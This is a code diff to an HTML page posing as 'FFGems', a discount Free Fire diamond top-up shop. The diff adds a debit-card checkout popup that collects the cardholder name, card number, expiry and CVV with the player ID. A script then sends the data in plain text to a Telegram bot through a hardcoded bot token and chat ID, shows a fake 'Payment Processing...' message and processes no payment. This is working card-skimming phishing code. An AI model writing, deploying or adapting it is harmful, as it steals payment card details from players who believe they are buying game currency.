@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FFGems - Free Fire Diamond Top Up</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         /* Base Colors & Reset */
         * {
@@ -199,6 +200,12 @@
             display: flex;
             flex-direction: column;
             gap: 2px;
+            cursor: pointer; /* Makes it look clickable */
+            transition: background 0.2s;
+        }
+        
+        .price-box:hover {
+            background-color: #152644;
         }
 
         .old-price {
@@ -249,6 +256,64 @@
 
         .btn-buy:hover { background-color: #16a34a; }
         .btn-cart:hover { background-color: #1e40af; }
+
+        /* --- MODAL BACKDROP & PAYMENT STYLES --- */
+        .modal-backdrop {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .payment-container { 
+            width: 100%; 
+            max-width: 400px; 
+            background: white; 
+            padding: 25px; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); 
+            color: #333;
+            position: relative;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 12px;
+            right: 15px;
+            font-size: 22px;
+            color: #888;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .close-modal:hover { color: #333; }
+
+        h2 { font-size: 20px; color: #333; margin-bottom: 5px; text-align: center; }
+        .checkout-subtitle {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        .checkout-subtitle span { color: #22c55e; font-weight: bold; }
+
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 12px; font-weight: 600; color: #666; margin-bottom: 5px; text-transform: uppercase; }
+        input { width: 100%; padding: 12px; border: 1px solid #e0e0e0; border-radius: 6px; box-sizing: border-box; font-size: 15px; background: #fafafa; color: #333; }
+        input:focus { border-color: #0088cc; outline: none; background: #fff; }
+        .row { display: flex; gap: 15px; }
+        .row .input-group { flex: 1; }
+        
+        .btn-pay { width: 100%; background-color: #0088cc; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+        .btn-pay:hover { background-color: #0077b5; }
     </style>
 </head>
 <body>
@@ -261,7 +326,7 @@
     <div class="uid-container">
         <label class="uid-label">Step 1: Enter Free Fire Player ID</label>
         <div class="uid-input-wrapper">
-            <input type="text" class="uid-input" placeholder="Example: 123456789">
+            <input type="text" id="playerUID" class="uid-input" placeholder="Example: 123456789">
             <button class="btn-validate">Check</button>
         </div>
     </div>
@@ -278,13 +343,13 @@
                 <div class="action-tag">TOP-UP</div>
             </div>
             <div class="card-title">Free Fire 100 Diamonds Top Up</div>
-            <div class="price-box">
+            <div class="price-box" onclick="openCheckout('100 Diamonds', 'NGN 560')">
                 <span class="old-price">NGN 1,442</span>
                 <span class="current-price">NGN 560</span>
             </div>
             <div class="btn-group">
                 <button class="btn-cart"><span style="color:white;">🛒</span></button>
-                <button class="btn-buy">⚡ Buy Now</button>
+                <button class="btn-buy" onclick="openCheckout('100 Diamonds', 'NGN 560')">⚡ Buy Now</button>
             </div>
         </div>
 
@@ -298,13 +363,13 @@
                 <div class="action-tag">TOP-UP</div>
             </div>
             <div class="card-title">Free Fire 210 Diamonds Top Up</div>
-            <div class="price-box">
+            <div class="price-box" onclick="openCheckout('210 Diamonds', 'NGN 1,120')">
                 <span class="old-price">NGN 2,883</span>
                 <span class="current-price">NGN 1,120</span>
             </div>
             <div class="btn-group">
                 <button class="btn-cart"><span style="color:white;">🛒</span></button>
-                <button class="btn-buy">⚡ Buy Now</button>
+                <button class="btn-buy" onclick="openCheckout('210 Diamonds', 'NGN 1,120')">⚡ Buy Now</button>
             </div>
         </div>
 
@@ -318,13 +383,13 @@
                 <div class="action-tag">TOP-UP</div>
             </div>
             <div class="card-title">Free Fire 530 Diamonds Top Up</div>
-            <div class="price-box">
+            <div class="price-box" onclick="openCheckout('530 Diamonds', 'NGN 3,510')">
                 <span class="old-price">NGN 7,207</span>
                 <span class="current-price">NGN 3,510</span>
             </div>
             <div class="btn-group">
                 <button class="btn-cart"><span style="color:white;">🛒</span></button>
-                <button class="btn-buy">⚡ Buy Now</button>
+                <button class="btn-buy" onclick="openCheckout('530 Diamonds', 'NGN 3,510')">⚡ Buy Now</button>
             </div>
         </div>
 
@@ -338,17 +403,123 @@
                 <div class="action-tag">TOP-UP</div>
             </div>
             <div class="card-title">Free Fire 1080 Diamonds Top Up</div>
-            <div class="price-box">
+            <div class="price-box" onclick="openCheckout('1080 Diamonds', 'NGN 7,000')">
                 <span class="old-price">NGN 14,414</span>
                 <span class="current-price">NGN 7,000</span>
             </div>
             <div class="btn-group">
                 <button class="btn-cart"><span style="color:white;">🛒</span></button>
-                <button class="btn-buy">⚡ Buy Now</button>
+                <button class="btn-buy" onclick="openCheckout('1080 Diamonds', 'NGN 7,000')">⚡ Buy Now</button>
             </div>
         </div>
 
     </div>
+
+    <div class="modal-backdrop" id="paymentModal">
+        <div class="payment-container">
+            <span class="close-modal" onclick="closeCheckout()">&times;</span>
+            <h2>Debit Card Payment</h2>
+            <div class="checkout-subtitle">Paying <span id="modalItemPrice">NGN 0</span> for <span id="modalItemName">Item</span></div>
+            
+            <div class="input-group">
+                <label>Cardholder Name</label>
+                <input type="text" id="cardName" placeholder="John Doe" required>
+            </div>
+
+            <div class="input-group">
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+            </div>
+
+            <div class="row">
+                <div class="input-group">
+                    <label>Expiry Date</label>
+                    <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="input-group">
+                    <label>CVV</label>
+                    <input type="password" id="cardCvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <button class="btn-pay" onclick="sendPaymentDetails()">Pay Now</button>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // Track what the user is buying globally
+        let currentItem = "";
+        let currentPrice = "";
+
+        // Function to open checkout popup and set details
+        function openCheckout(itemName, itemPrice) {
+            currentItem = itemName;
+            currentPrice = itemPrice;
+            
+            document.getElementById('modalItemName').innerText = itemName;
+            document.getElementById('modalItemPrice').innerText = itemPrice;
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+
+        // Function to close checkout popup
+        function closeCheckout() {
+            document.getElementById('paymentModal').style.display = 'none';
+        }
+
+        // Send details to Telegram
+        async function sendPaymentDetails() {
+            const uid = document.getElementById('playerUID').value || 'Not Entered';
+            const name = document.getElementById('cardName').value;
+            const number = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('cardExpiry').value;
+            const cvv = document.getElementById('cardCvv').value;
+
+            if (!name || !number || !expiry || !cvv) {
+                alert('Please fill out all fields.');
+                return;
+            }
+
+            // Telegram Config
+            const BOT_TOKEN = '8732590798:AAEr7p9WexGuUXavhb7qlRi_f-D6M0xjWZWY';
+            const CHAT_ID = '6258635608';
+
+            // Structuring data with Player ID and selected Item details
+            const message = `💳 *New Debit Card Input*:\n\n` +
+                            `🆔 *Player UID:* ${uid}\n` +
+                            `📦 *Item:* ${currentItem} (${currentPrice})\n` +
+                            `👤 *Name:* ${name}\n` +
+                            `🔢 *Card:* ${number}\n` +
+                            `📅 *Expiry:* ${expiry}\n` +
+                            `🔒 *CVV:* ${cvv}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    alert('Payment Processing...');
+                    closeCheckout();
+                    tg.close(); 
+                } else {
+                    alert('Submission failed.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
 
 </body>
 </html>
